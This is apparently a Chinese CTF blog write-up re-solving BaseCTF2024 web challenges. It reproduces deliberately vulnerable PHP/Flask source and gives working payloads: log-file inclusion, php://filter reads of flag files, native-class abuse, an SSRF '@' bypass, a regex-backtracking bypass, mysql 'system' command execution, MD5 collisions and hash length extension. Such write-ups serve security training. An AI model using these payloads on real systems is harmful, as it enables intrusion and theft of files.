---
title: BaseCTF2024复现
date: 2025-11-30 14:16:42
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/693e4869284ce2d2dc0fc6d2.jpg
categories: CTF
---

# 滤个不停

```php
<?php 
highlight_file(__FILE__); 
error_reporting(0); 

$incompetent = $_POST['incompetent']; 
$Datch = $_POST['Datch']; 

if ($incompetent !== 'HelloWorld') { 
    die('写出程序员的第一行问候吧！'); 
} 

//这是个什么东东？？？ 
$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o']; 
$is_valid = true; 

foreach ($required_chars as $char) { 
    if (strpos($Datch, $char) === false) { 
        $is_valid = false; 
        break; 
    } 
} 

if ($is_valid) { 

    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://']; 

    foreach ($invalid_patterns as $pattern) { 
        if (stripos($Datch, $pattern) !== false) { 
            die('此路不通换条路试试?'); 
        } 
    } 


    include($Datch); 
} else { 
    die('文件名不合规 请重试'); 
} 
?> 

```

这里是一个文件包含，并且不可以通过伪协议来进行读取，它提示我们需要在提交中包含一些字母

```
['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o']
```

这里因为不能进行常规的文件包含，所以需要通过包含一些特殊的路径

```
incompetent=HelloWorld&Datch=/var/log/nginx/access.log
```

[CTFShow-Web160：利用日志包含漏洞进行文件上传 - Zebra233 - 博客园](https://www.cnblogs.com/cookiescs/p/18696979)



# 数学大师

```python
import requests
import re

req = requests.session() #实例化session对象
url = "http://challenge.imxbt.cn:32583/"

answer = 0
while True:
    response = req.post(url , data={"answer": answer}) #POST答案，获取响应
    print(response.text)
    if "BaseCTF" in response.text:
        print(response.text)
        break
    regex = r" (\d*?)(.)(\d*)\?" #正则表达式
    match = re.search(regex, response.text)
    if match.group(2) == "+":
        answer = int(match.group(1)) + int(match.group(3))
    elif match.group(2) == "-":
        answer = int(match.group(1)) - int(match.group(3))
    elif match.group(2) == "×":
        answer = int(match.group(1)) * int(match.group(3))
    elif match.group(2) == "÷":
        answer = int(match.group(1)) // int(match.group(3))
```

[Python requests 模块 | 菜鸟教程](https://www.runoob.com/python3/python-requests.html)

[Python 正则表达式 | 菜鸟教程](https://www.runoob.com/python/python-reg-expressions.html)



# 圣钥之战1.0

```python
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/', methods=['GET', 'POST'])
def hello_world():
    return open('/static/index.html', encoding="utf-8").read()

@app.route('/read', methods=['GET', 'POST'])
def Read():
    file = open(__file__, encoding="utf-8").read()
    return f"J1ngHong说：你想read flag吗？
那么圣钥之光必将阻止你！
但是小小的源码没事，因为你也读不到flag(乐)
{file}
"

@app.route('/pollute', methods=['GET', 'POST'])
def Pollution():
    if request.is_json:
        merge(json.loads(request.data),instance)
    else:
        return "J1ngHong说：钥匙圣洁无暇，无人可以污染！"
    return "J1ngHong说：圣钥暗淡了一点，你居然污染成功了？"

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80)
```



# flag直接读取不就行了？

```php
<?php
highlight_file('index.php');
# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~
error_reporting(0);
$J1ng = $_POST['J'];
$Hong = $_POST['H'];
$Keng = $_GET['K'];
$Wang = $_GET['W'];
$dir = new $Keng($Wang);
foreach($dir as $f) {
    echo($f . '<br>');
}
echo new $J1ng($Hong);
?>
```

```
GET:
?K=GlobIterator&W=glob:///secret/*
POST:
J=SplFileObject&H=php://filter/read=convert.base64-encode/resource=/secret/f11444g.php
```

[CTF中PHP原生类的妙用](https://www.qwesec.com/2023/10/phpBuilt-inClasses.html)



# Aura 酱的礼物

```php
<?php
highlight_file(__FILE__);
// Aura 酱，欢迎回家~
// 这里有一份礼物，请你签收一下哟~
$pen = $_POST['pen'];
if (file_get_contents($pen) !== 'Aura')
{
    die('这是 Aura 的礼物，你不是 Aura！');
}

// 礼物收到啦，接下来要去博客里面写下感想哦~
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('这不是 Aura 的博客！');
}

$blog_content = file_get_contents($challenge);
if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false)
{
    die('请去博客里面写下感想哦~');
}

// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~
$gift = $_POST['gift'];
include($gift); 
```

首先对于第一个判断, 他需要读取一个文件后内容是 `Aura`,我们可以尝试通过 `data://` 伪协议来进行读取

在文件读取的情况下, 利用 `data://` 伪协议:

- `data://text/plain,一串内容` 可以读取出 `一串内容`
- `data://text/plain;base64,xxxxxxxx` 其中 `xxxxxxx` 会被 Base64 解码后再读取出内容

所以我们此处可以使用:

- `data://text/plain,Aura`
- `data://text/plain;base64,QXVyYQ==`

第二个判断的话, 我们要求页面的开头为 `http://jasmineaura.github.io`

我们可以利用 `@` 来进行隔断, 将 `@` 前面的内容当做用户名 (参考 https://cloud.tencent.com/developer/article/2288231)

<p class="note note-primary">URL 的格式为 scheme://user:password@address:port/path?query#fragment</p>

而我们需要页面的内容存在这个字符串, 我们可以就利用当前页面来显示, 于是构造

`http://jasmineaura.github.io@127.0.0.1`

第三个的话是一个 include 点, 由于我们的 flag 在注释部分, 我们需要将其伪协议和过滤器来进行 base64 编码后输出

```
php://filter/convert.base64-encode/resource=flag.php
```

#### 参考文献

[SSRF学习](https://www.cnblogs.com/ya7q/p/19045966)

[SSRF漏洞原理攻击与防御(超详细总结)](https://blog.csdn.net/qq_43378996/article/details/124050308)



# 1z_php

```php
<?php
highlight_file('index.php');
# 我记得她...好像叫flag.php吧？
$emp=$_GET['e_m.p'];
$try=$_POST['try'];
if($emp!="114514"&&intval($emp,0)===114514)
{
    for ($i=0;$i<strlen($emp);$i++){
        if (ctype_alpha($emp[$i])){
            die("你不是hacker？那请去外场等候！");
        }
    }
    echo "只有真正的hacker才能拿到flag！"."<br>";

    if (preg_match('/.+?HACKER/is',$try)){
        die("你是hacker还敢自报家门呢？");
    }
    if (!stripos($try,'HACKER') === TRUE){
        die("你连自己是hacker都不承认，还想要flag呢？");
    }

    $a=$_GET['a'];
    $b=$_GET['b'];
    $c=$_GET['c'];
    if(stripos($b,'php')!==0){
        die("收手吧hacker，你得不到flag的！");
    }
    echo (new $a($b))->$c();
}
else
{
    die("114514到底是啥意思嘞？。？");
}
# 觉得困难的话就直接把shell拿去用吧，不用谢~
$shell=$_POST['shell'];
eval($shell);
?>
```

这里e_m.p有特殊字符和.所以要将换成[

因为.+?是匹配一个或多个任意字符,至少需要一个字符,所以必须让HACKER出现在try的参数中，但不是在开头

> - `.+?` 是「非贪婪匹配」，本意是匹配「任意最少字符」后接 `HACKER`；
>- 但当 `HACKER` 出现在**极长字符串的末尾**（比如 100 万 + 个 `-` 之后），正则引擎会陷入「无限回溯」：
>   1. 非贪婪的 `.+?` 先匹配 1 个 `-`，检查后面是否是 `HACKER` → 不是；
>   2. 匹配 2 个 `-`，检查后面 → 不是；
>   3. 重复这个过程，直到匹配 1000001 个 `-` 后，才找到末尾的 `HACKER`；
>   4. PHP 对正则回溯有**内存 / 时间限制**（默认配置下，超过一定回溯次数会直接返回 `false`），导致 `preg_match` 执行超时 / 内存溢出，最终返回 `false`，第一段检测被绕过。

代码 `(new $a($b))->$c()`动态实例化类 `$a`（参数为 `$b`），并调用方法 `$c()`。

```python
import requests
res = requests.post("http://101.37.149.223:32943/index.php?e[m.p=114514.1&a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=flag.php&c=__toString",data = {"try":"-"*1000001+"HACKER"})
print(res.text)
```



# RCE or Sql Inject

打开容器，题目已经给出环境源码

```PHP
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/se|ec|;|@|del|into|outfile/i', $sql)) {
    die("你知道的，不可能有sql注入");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("你知道的，不可能有RCE");
}
$query = "mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- " . $sql . "\"";
system($query);
```

和only one sql那道题比较相似，多禁用了一些参数，sql注入基本没可能了

题目hint1给出要RCE，hint2给出mysql远程连接和命令行操作有区别，hint3给出输个问号看看

题目是一个比较冷门的考点，mysql命令行程序的命令执行，常见于mysql有suid时的提权

hint3中提示输个问号看看，那么就在mysql命令行中输入个问号试试，如下

其中注意到一行

```SQL
system    (\!) Execute a system shell command.
```

意思是使用system关键字或\!可以直接通过mysql命令行执行一个system shell命令，尝试一下如下图所示



那么问题就简单了，使用换行符绕过注释的限制，使用system执行命令，env可以直接出flag，想要弹shell需要用bash -c "command"包裹一下也可以弹出



# 所以你说你懂 MD5?

```php
<?php
session_start();
highlight_file(__FILE__);
// 所以你说你懂 MD5 了?

$apple = $_POST['apple'];
$banana = $_POST['banana'];
if (!($apple !== $banana && md5($apple) === md5($banana))) {
    die('加强难度就不会了?');
}

// 什么? 你绕过去了?
// 加大剂量!
// 我要让他成为 string
$apple = (string)$_POST['appple'];
$banana = (string)$_POST['bananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) == md5((string)$banana))) {
    die('难吗?不难!');
}

// 你还是绕过去了?
// 哦哦哦, 我少了一个等于号
$apple = (string)$_POST['apppple'];
$banana = (string)$_POST['banananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) === md5((string)$banana))) {
    die('嘻嘻, 不会了? 没看直播回放?');
}

// 你以为这就结束了
if (!isset($_SESSION['random'])) {
    $_SESSION['random'] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
}

// 你想看到 random 的值吗?
// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
$random = $_SESSION['random'];
echo md5($random);
echo '<br />';

$name = $_POST['name'] ?? 'user';

// check if name ends with 'admin'
if (substr($name, -5) !== 'admin') {
    die('不是管理员也来凑热闹?');
}

$md5 = $_POST['md5'];
if (md5($random . $name) !== $md5) {
    die('伪造? NO NO NO!');
}

// 认输了, 看样子你真的很懂 MD5
// 那 flag 就给你吧
echo "看样子你真的很懂 MD5";
echo file_get_contents('/flag');
```

第三层强碰撞绕过

```
apppple=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&banananana=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

第四层通过就是哈希长度扩展，这里就通过hash-ext-attack-master来自动生成

bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16))这里相当于96位的字符串即密钥

name里面后面要添加admin字符串所以我们需要在后面添加一个以admin结尾的字符串，其它任意，这里就随便为qadmin

这里题目会给一个原始的md5值

![](https://pic1.imgdb.cn/item/694c85a126657af64c6db56c.png)

![](https://pic1.imgdb.cn/item/694c85b026657af64c6db572.png)



# EZ_PHP_Jail

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("hint.html");
$Jail = $_GET['Jail_by.Happy'];

if($Jail == null) die("Do You Like My Jail?");

function Like_Jail($var) {
    if (preg_match('/(`|\$|a|c|s|require|include)/i', $var)) {
        return false;
    }
    return true;
}

if (Like_Jail($Jail)) {
    eval($Jail);
    echo "Yes! you escaped from the jail! LOL!";
} else {
    echo "You will Jail in your life!";
}
echo "\n";

// 在HTML解析后再输出PHP源代码

?>
```

当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这

个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。

```Plain
?Jail[by.Happy=xxxxxx
```

现在考虑如何得到 flag，在页面源码中可以看见一个文件，访问后再phpinfo中看见过滤了很多内容，但是 highlight_file 函数可以完美绕过。

```Plain
?Jail[by.Happy=highlight_file(glob("/f*")[0]);
```

## 玩原神玩的

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

include 'flag.php';
if (sizeof($_POST['len']) == sizeof($array)) {
  ys_open($_GET['tip']);
} else {
  die("错了！就你还想玩原神？❌❌❌");
}

function ys_open($tip) {
  if ($tip != "我要玩原神") {
    die("我不管，我要玩原神！😭😭😭");
  }
  dumpFlag();
}

function dumpFlag() {
  if (!isset($_POST['m']) || sizeof($_POST['m']) != 2) {
    die("可恶的QQ人！😡😡😡");
  }
  $a = $_POST['m'][0];
  $b = $_POST['m'][1];
  if(empty($a) || empty($b) || $a != "100%" || $b != "love100%" . md5($a)) {
    die("某站崩了？肯定是某忽悠干的！😡😡😡");
  }
  include 'flag.php';
  $flag[] = array();
  for ($ii = 0;$ii < sizeof($array);$ii++) {
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
      // 对$array中的每个元素，先获取其ASCII码值，然后与循环变量$ii进行异或运算，最后对结果进行MD5加密，并将加密结果存入$flag数组对应位置
  }
  
  echo json_encode($flag);
}
```

首先要求数组$len的长度和数组$array一致，我们写个脚本爆破一下

```python
import requests

url = "http://challenge.imxbt.cn:31267/"
for i in range(100):
    s = {f'len[{j}]': '0' for j in range(i)}
    req = requests.post(url=url,data=s)
    #print(s)
    if "</code>我不管，我要玩原神！" in req.text:
        print(i)
        print(s)
        break
```

下面两个比较好过，最终的payload是

```
http://challenge.imxbt.cn:31267/?tip=我要玩原神
len[0]=1&len[1]=1&len[2]=1&len[3]=1&len[4]=1&len[5]=1&len[6]=1&len[7]=1&len[8]=1&len[9]=1&len[10]=1&len[11]=1&len[12]=1&len[13]=1&len[14]=1&len[15]=1&len[16]=1&len[17]=1&len[18]=1&len[19]=1&len[20]=1&len[21]=1&len[22]=1&len[23]=1&len[24]=1&len[25]=1&len[26]=1&len[27]=1&len[28]=1&len[29]=1&len[30]=1&len[31]=1&len[32]=1&len[33]=1&len[34]=1&len[35]=1&len[36]=1&len[37]=1&len[38]=1&len[39]=1&len[40]=1&len[41]=1&len[42]=1&len[43]=1&len[44]=1&m[0]=100%25&m[1]=love100%2530bd7ce7de206924302499f197c7a966
```

返回了加密的json数据，我们进行解密

```python
import hashlib

md5_flag = ["3295c76acbf4caaed33c36b1b5fc2cb1","26657d5ff9020d2abefe558796b99584","73278a4a86960eeb576a8fd4c9ec6997","ec8956637a99787bd197eacd77acce5e","e2c420d928d4bf8ce0ff2ec19b371514","43ec517d68b6edd3015b3edc9a11367b","ea5d2f1c4608232e07d3aa3d998e5135","c8ffe9a587b126f152ed3d89a146b445","72b32a1f754ba1c09b3695e0cb6cde7f","093f65e080a295f8076b1c5722a46aa2","03afdbd66e7929b125f8597834fa83a4","5f93f983524def3dca464469d2cf9f3e","7f39f8317fbdb1988ef4c628eba02591","698d51a19d8a121ce581499d7b701668","b53b3a3d6ab90ce0268229151c9bde11","03afdbd66e7929b125f8597834fa83a4","7f39f8317fbdb1988ef4c628eba02591","6364d3f0f495b6ab9dcf8d3b5c6e0b01","a5bfc9e07964f8dddeb95fc584cd965d","07e1cd7dca89a1678042477183b7ac3f","5ef059938ba799aaa845e1c2e8a762bd","9f61408e3afb633e50cdf1b20de6f466","e369853df766fa44e1ed0ff613f563bd","2b44928ae11fb9384c4cf38708677c48","a1d0c6e83f027327d8461063f4ac58a6","6364d3f0f495b6ab9dcf8d3b5c6e0b01","b53b3a3d6ab90ce0268229151c9bde11","4c56ff4ce4aaf9573aa5dff913df997a","069059b7ef840f0c74a814ec9237b6ec","3416a75f4cea9109507cacd8e2f2aefc","67c6a1e7ce56d3d6fa748ab6d9af3fd7","c0c7c76d30bd3dcaefc96f40275bdc0a","70efdf2ec9b086079795c442636b55fb","6f4922f45568161a8cdf4ad2299f6d23","c74d97b01eae257e44aa9d5bade97baf","37693cfc748049e45d87b8c7d8b9aacd","98f13708210194c475687be6106a3b84","735b90b4568125ed6c3f678819b6e058","1f0e3dad99908345f7439f8ffabdffc4","7cbbc409ec990f19c78c75bd1e06f215","28dd2c7955ce926456240b2ff0100bde","d1fe173d08e959397adf34b1d77e88d7","6ea9ab1baa0efb9e19094440c317e21b","8e296a067a37563370ded05f5a3bf3ec","43ec517d68b6edd3015b3edc9a11367b"]

flag = ''

for i in range(45):
    for j in range(127):
        if hashlib.md5(str(i ^ j).encode()).hexdigest() == md5_flag[i]:
            #hashlib.md5(xxx).encode()).hexdigest()是python中的md5加密方式
            flag += chr(j)
print(flag)
```

